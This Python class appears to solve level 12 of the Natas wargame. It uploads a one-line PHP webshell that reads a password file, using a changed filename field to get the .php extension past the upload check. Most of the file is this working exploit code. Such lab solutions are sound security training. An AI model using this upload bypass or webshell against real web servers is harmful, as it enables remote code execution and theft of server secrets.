import re
from src.natas.base_level import NatasLevel
import os
import time

class Level_12(NatasLevel):

  num = 12
  explanation = "On this level, the filename extension can be controlled to upload a PHP webshell,\n     which is then executed to read `/etc/natas_webpass/natas13`."

  def exploit(self) -> str:

    resp        = self.session.get(self.base_url)
    php_file    = "index.php"
    php_content = '<?php echo shell_exec("cat /etc/natas_webpass/natas13"); ?>'

    with open(php_file, "w", encoding = "utf-8") as file:
      file.write(php_content)

    match       = re.search(r'(?<=value=")[a-z0-9]+(?=\.jpg)', resp.text)
    random_name = match.group()

    resp_php    = self.session.post(self.base_url + "/index.php", files = {
      'filename': (None, f'{random_name}.php'),
      'uploadedfile': ('shell.php', open(php_file, 'rb'))
    }, data = {'MAX_FILE_SIZE': '1000'})

    match_php = re.search(r'The file <a href="([^"]+)"', resp_php.text, re.MULTILINE).group(1).strip()
    resp_pass = self.session.get(self.base_url + f"/{match_php}")

    time.sleep(0.5)
    if os.path.exists(php_file):
      os.remove(php_file)
    else:
      pass

    return resp_pass.text.strip()
